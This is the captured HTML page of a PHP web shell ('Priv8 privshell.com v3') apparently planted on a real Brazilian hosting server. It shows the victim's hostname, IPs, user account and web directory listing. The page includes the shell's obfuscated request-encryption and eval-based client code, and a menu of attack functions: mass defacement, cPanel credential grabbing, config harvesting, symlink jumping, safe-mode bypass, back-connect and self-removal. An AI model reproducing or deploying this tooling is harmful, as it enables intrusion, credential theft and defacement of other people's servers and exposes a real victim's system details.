<html><head><meta http-equiv='Content-Type' content='text/html; charset=utf-8'><title> Priv8 privshell.com v3</title>
	<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
<style>
input[type=submit] {
    padding:1px 7px;
    background:#ffb101bd;
    border:0 none;
    cursor:pointer;
    -webkit-border-radius: 5px;
    border-radius: 5px;
}
	body {background-color:#000000; color:#e1e1e1; margin:0; font:normal 75% Open Sans, sans-serif; background-image:url('https://i.imgur.com/hLcQCBx.gif'); }

	canvas{ display: block; vertical-align: bottom;}
	#particles-js{width: 100%; height: 100px; background-color: #000000; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
	body,td,th	{font:10pt Open Sans, sans-serif;margin:0;vertical-align:top;}
	table.infoo	{color:#ffffff; background-image: url('https://i.imgur.com/gL0UG8Y.png'); background-position: center;  background-repeat:no-repeat;  -webkit-background-size: cover;	-moz-background-size: cover; -o-background-size: cover;	background-size: 80%; }
	table.info	{color:#ffffff;}
	table#toolsTbl {background-color: #000000; background-image:url('https://i.imgur.com/hLcQCBx.gif'); }
	span,h1,a	{color:#ffb101 !important;}
	span		{font-weight:bolder;}
	h1			{border-left:5px solid #ffb101;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px; }
	div.content	{padding:5px;margin-left:5px;background-color:#000000; background-image:url('https://i.imgur.com/hLcQCBx.gif');}
	a			{text-decoration:none;}
	a:hover		{text-decoration:underline;}
	.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
	.tooltip:hover::after {opacity:1;visibility:visible;}
	.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
	.bigarea	{min-width:100%;max-width:100%;height:400px;}
	input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Open Sans, sans-serif;outline:none; }
	label {position:relative}
	label:after {content:'<>';font:10px 'Open Sans', sans-serif, monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
	label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
	form		{margin:0px;}
	#toolsTbl	{text-align:center;}
	#fak 		{background:none;}
	#fak td 	{padding:5px 0 0 0;}
	iframe		{border:1px solid #000000;}
	.toolsInp	{width:300px}
	.main th	{text-align:left;background-color:#000000;}
	.main tr:hover{background-color:#373c42;}
	.main td, th{vertical-align:middle;}
	input[type='submit']{background-color:#ffb101bd;}
	input[type='button']{background-color:#ffb101;}
	input[type='submit']:hover{background-color:#ffb101bd;}
	input[type='button']:hover{background-color:#ffb101;}
	.l1			{background-color:#202832;}
	pre			{font:9pt 'Open Sans', sans-serif;}
</style>
<script>
    var c_ = '/home/zuapp/public_html/';
    var a_ = 'FilesMan'
    var charset_ = 'utf-8';
    var p1_ = '';
    var p2_ = '';
    var p3_ = '';
    var d = document;
	function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
	function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
	function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		d.mf.a.value = encrypt(d.mf.a.value,'4279f4c94d9f22de331ff904cc49e0fc');
		d.mf.c.value = encrypt(d.mf.c.value,'4279f4c94d9f22de331ff904cc49e0fc');
		d.mf.p1.value = encrypt(d.mf.p1.value,'4279f4c94d9f22de331ff904cc49e0fc');
		d.mf.p2.value = encrypt(d.mf.p2.value,'4279f4c94d9f22de331ff904cc49e0fc');
		d.mf.p3.value = encrypt(d.mf.p3.value,'4279f4c94d9f22de331ff904cc49e0fc');
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = 'ajax=true';
		for(i=0;i<d.mf.elements.length;i++)
			params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
		sr('/soz.php', params);
	}
	function sr(url, params) {
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp("(\\d+)([\\S\\s]*)", 'm');
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} else alert('Request error!');
	}
</script>
<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form><table class=infoo cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>Linux dedi-8438852.dolcitecnologia.com.br 3.10.0-1160.15.2.el7.x86_64 #1 SMP Wed Feb 3 15:06:38 UTC 2021 x86_64 <a href="https://anon.click/protected/https://www.google.com/search?q=Linux+dedi-8438852.dolcitecnologia.com.br+3.10.0-1160.15.2.el7.x86_64+%231+SMP+Wed+Feb+3+15%3A06%3A38+UTC+2021+x86_64" target="_blank">[ Google ]</a> <a href="https://www.exploit-db.com/search/?action=search&description=Linux+Kernel+3.10.0" target=_blank>[ Exploit-DB ]</a></nobr><br>1012 ( zuapp ) <span>Group:</span> 1011 ( zuapp )<br>7.4.29 <span>Safe mode:</span> <font color=#ffffff><b>OFF</b></font> <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a> <span>Datetime:</span> 2022-06-01 11:32:30<br>1761.89 GB <span>Free:</span> 1641.30 GB (93.16%)<br><a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/home/")'>home/</a><a href='#' onclick='g("FilesMan","/home/zuapp/")'>zuapp/</a><a href='#' onclick='g("FilesMan","/home/zuapp/public_html/")'>public_html/</a> <font color=#ffffff><b>drwxr-x---</b></font> <a href=# onclick="g('FilesMan','/home/zuapp/public_html','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)"><option value="Windows-1251" >Windows-1251</option><option value="UTF-8" >UTF-8</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></select></label><br><span>Server IP:</span><br>162.214.78.177<br><span>Client IP:</span><br>136.158.29.121</nobr></td></tr></table><table style="background-color:#373c42;" cellpadding=3 cellspacing=0 width=100%><tr><th> <font color="#ffb101">- <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a></font></th><th> <font color="#ffb101">- <a href="#" onclick="g('FilesMan',null,'','','')">Files</a></font></th><th> <font color="#ffb101">- <a href="#" onclick="g('Sql',null,'','','')">Mass Deface</a></font></th><th> <font color="#ffb101">- <a href="#" onclick="g('Adminer',null,'','','')">Adminer</a></font></th><th> <font color="#ffb101">- <a href="#" onclick="g('Console',null,'','','')">Terminal</a></font></th><th> <font color="#ffb101">- <a href="#" onclick="g('Edituser',null,'','','')">Mass User</a></font></th><th> <font color="#ffb101">- <a href="#" onclick="g('Php',null,'','','')">Grab Cpanel</a></font></th><th> <font color="#ffb101">- <a href="#" onclick="g('SafeMode',null,'','','')">Get Configs</a></font></th><th> <font color="#ffb101">- <a href="#" onclick="g('Sym',null,'','','')">Sym Python</a></font></th><th> <font color="#ffb101">- <a href="#" onclick="g('StringTools',null,'','','')">Jumping</a></font></th><th> <font color="#ffb101">- <a href="#" onclick="g('Bruteforce',null,'','','')">Cgi Telnet</a></font></th><th> <font color="#ffb101">- <a href="#" onclick="g('bypas',null,'','','')">Bypass</a></font></th><th> <font color="#ffb101">- <a href="#" onclick="g('Network',null,'','','')">BC</a></font></th><th> <font color="#ffb101">- <a href="#" onclick="g('Logout',null,'','','')">Logout</a></font></th><th> <font color="#ffb101">- <a href="#" onclick="g('SelfRemove',null,'','','')">Self Remove</a></font></th></tr></table><div><h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script><script>
	function sa() {
		for(i=0;i<d.files.elements.length;i++)
			if(d.files.elements[i].type == 'checkbox')
				d.files.elements[i].checked = d.files.elements[0].checked;
	}
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g("FilesMan",null,"s_name_0")'>Name</a></th><th><a href='#' onclick='g("FilesMan",null,"s_size_0")'>Size</a></th><th><a href='#' onclick='g("FilesMan",null,"s_modify_0")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g("FilesMan",null,"s_perms_0")'>Permissions</a></th><th>Actions</th></tr><tr><td><input type=checkbox name="f[]" value=".." class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/..');" ><b>[ .. ]</b></a></td><td>dir</td><td>2022-05-23 22:28:58</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'..','chmod')"><font color=#ffffff><b>drwx--x--x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'..', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'..', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value=".well-known" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/.well-known');" ><b>[ .well-known ]</b></a></td><td>dir</td><td>2022-04-15 14:16:10</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'.well-known','chmod')"><font color=#ffffff><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'.well-known', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'.well-known', 'touch')">T</a></td></tr><tr><td><input type=checkbox name="f[]" value="_core" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/_core');" ><b>[ _core ]</b></a></td><td>dir</td><td>2022-04-15 14:16:09</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'_core','chmod')"><font color=#ffffff><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'_core', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'_core', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="administracao" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/administracao');" ><b>[ administracao ]</b></a></td><td>dir</td><td>2022-05-13 14:36:28</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'administracao','chmod')"><font color=#ffffff><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'administracao', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'administracao', 'touch')">T</a></td></tr><tr><td><input type=checkbox name="f[]" value="app" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/app');" ><b>[ app ]</b></a></td><td>dir</td><td>2022-04-15 14:09:10</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'app','chmod')"><font color=#ffffff><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'app', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'app', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="cgi-bin" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/cgi-bin');" ><b>[ cgi-bin ]</b></a></td><td>dir</td><td>2022-04-15 00:19:39</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'cgi-bin','chmod')"><font color=#ffffff><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'cgi-bin', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'cgi-bin', 'touch')">T</a></td></tr><tr><td><input type=checkbox name="f[]" value="comece" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/comece');" ><b>[ comece ]</b></a></td><td>dir</td><td>2022-05-19 02:00:04</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'comece','chmod')"><font color=#ffffff><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'comece', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'comece', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="conheca" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/conheca');" ><b>[ conheca ]</b></a></td><td>dir</td><td>2022-05-22 05:45:46</td><td>zuapp/nobody</td><td><a href=# onclick="g('FilesTools',null,'conheca','chmod')"><font color=#ffffff><b>drwxr-x---</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'conheca', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'conheca', 'touch')">T</a></td></tr><tr><td><input type=checkbox name="f[]" value="esqueci" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/esqueci');" ><b>[ esqueci ]</b></a></td><td>dir</td><td>2022-04-15 13:14:59</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'esqueci','chmod')"><font color=#ffffff><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'esqueci', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'esqueci', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="localizacao" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/localizacao');" ><b>[ localizacao ]</b></a></td><td>dir</td><td>2022-04-15 13:15:00</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'localizacao','chmod')"><font color=#ffffff><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'localizacao', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'localizacao', 'touch')">T</a></td></tr><tr><td><input type=checkbox name="f[]" value="login" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/login');" ><b>[ login ]</b></a></td><td>dir</td><td>2022-04-29 18:54:33</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'login','chmod')"><font color=#ffffff><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'login', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'login', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="logout" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/logout');" ><b>[ logout ]</b></a></td><td>dir</td><td>2022-04-15 13:15:00</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'logout','chmod')"><font color=#ffffff><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'logout', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'logout', 'touch')">T</a></td></tr><tr><td><input type=checkbox name="f[]" value="novasenha" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/novasenha');" ><b>[ novasenha ]</b></a></td><td>dir</td><td>2022-04-15 13:15:00</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'novasenha','chmod')"><font color=#ffffff><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'novasenha', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'novasenha', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="painel" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/painel');" ><b>[ painel ]</b></a></td><td>dir</td><td>2022-05-14 18:23:19</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'painel','chmod')"><font color=#ffffff><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'painel', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'painel', 'touch')">T</a></td></tr><tr><td><input type=checkbox name="f[]" value="qrcode" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/qrcode');" ><b>[ qrcode ]</b></a></td><td>dir</td><td>2022-04-15 13:16:33</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'qrcode','chmod')"><font color=#ffffff><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'qrcode', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'qrcode', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="site" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/zuapp/public_html/site');" ><b>[ site ]</b></a></td><td>dir</td><td>2022-05-31 02:45:21</td><td>zuapp/nobody</td><td><a href=# onclick="g('FilesTools',null,'site','chmod')"><font color=#ffffff><b>drwxr-x---</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'site', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'site', 'touch')">T</a></td></tr><tr><td><input type=checkbox name="f[]" value=".htaccess" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'.htaccess', 'view')">.htaccess</a></td><td>1.66 KB</td><td>2022-05-22 05:45:46</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'.htaccess','chmod')"><font color=#ffffff><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'.htaccess', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'.htaccess', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'.htaccess', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'.htaccess', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'.htaccess', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value=".user.ini" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'.user.ini', 'view')">.user.ini</a></td><td>580 B</td><td>2022-04-15 18:41:27</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'.user.ini','chmod')"><font color=#ffffff><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'.user.ini', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'.user.ini', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'.user.ini', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'.user.ini', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'.user.ini', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="404.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'404.php', 'view')">404.php</a></td><td>1.65 KB</td><td>2022-04-15 18:41:28</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'404.php','chmod')"><font color=#ffffff><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'404.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'404.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'404.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'404.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'404.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="consultaw.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'consultaw.php', 'view')">consultaw.php</a></td><td>570 B</td><td>2022-04-15 13:15:59</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'consultaw.php','chmod')"><font color=#ffffff><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'consultaw.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'consultaw.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'consultaw.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'consultaw.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'consultaw.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="cron.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'cron.php', 'view')">cron.php</a></td><td>2.69 KB</td><td>2022-04-15 13:16:01</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'cron.php','chmod')"><font color=#ffffff><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'cron.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'cron.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'cron.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'cron.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'cron.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="enc.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'enc.php', 'view')">enc.php</a></td><td>1 B</td><td>2022-06-01 10:01:15</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'enc.php','chmod')"><font color=#ffffff><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'enc.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'enc.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'enc.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'enc.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'enc.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="index.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'index.php', 'view')">index.php</a></td><td>6.09 KB</td><td>2022-06-01 09:53:36</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'index.php','chmod')"><font color=#ffffff><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'index.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'index.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'index.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'index.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'index.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="mpp.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'mpp.php', 'view')">mpp.php</a></td><td>674 B</td><td>2022-04-15 18:42:20</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'mpp.php','chmod')"><font color=#ffffff><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'mpp.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'mpp.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'mpp.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'mpp.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'mpp.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="php.ini" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'php.ini', 'view')">php.ini</a></td><td>635 B</td><td>2022-04-15 13:16:01</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'php.ini','chmod')"><font color=#ffffff><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'php.ini', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'php.ini', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'php.ini', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'php.ini', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'php.ini', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="phpinfo.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'phpinfo.php', 'view')">phpinfo.php</a></td><td>834 B</td><td>2022-06-01 11:30:52</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'phpinfo.php','chmod')"><font color=#ffffff><b>-rw-rw-rw-</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'phpinfo.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'phpinfo.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'phpinfo.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'phpinfo.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'phpinfo.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="postback.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'postback.php', 'view')">postback.php</a></td><td>835 B</td><td>2022-04-15 13:16:00</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'postback.php','chmod')"><font 